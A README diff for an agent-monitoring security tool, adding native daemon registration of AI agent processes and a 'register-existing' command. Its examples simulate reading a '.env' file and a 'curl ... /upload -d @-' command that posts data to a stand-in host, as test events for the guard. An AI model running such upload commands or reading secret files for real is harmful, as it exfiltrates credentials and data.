@@ -38,7 +38,7 @@
 
 `agent` scans the prompt before launch, scans the launch command, monitors output, writes per-agent audit sources, and updates cmux status when cmux is available.
 
-`--with-os-guard` records simulated OS Guard coverage for the agent. It does not attach native macOS EndpointSecurity hooks.
+`--with-os-guard` records OS Guard coverage for the agent. When the Swift daemon is running, the spawned child PID is registered with daemon control so native `AUTH_OPEN`/`NOTIFY_EXEC` handling can watch it.
 
 ## Policy Server
 
@@ -54,9 +54,12 @@
 404gent os-guard status
 404gent os-guard simulate-open .env --agent demo --pid 1234
 404gent os-guard simulate-exec curl https://example.com/upload -d @- --agent demo --pid 1234
+404gent os-guard register-existing --names codex,gemini
 ```
 
 OS Guard commands simulate file/process events and send them through normal policy, audit, status, and cmux reporting. See `docs/OS_GUARD.md`.
+
+`register-existing` finds already-running agent processes with `pgrep -x` and registers matching PIDs with the Swift daemon control server on `127.0.0.1:7405`.
 
 ## cmux Watch
 
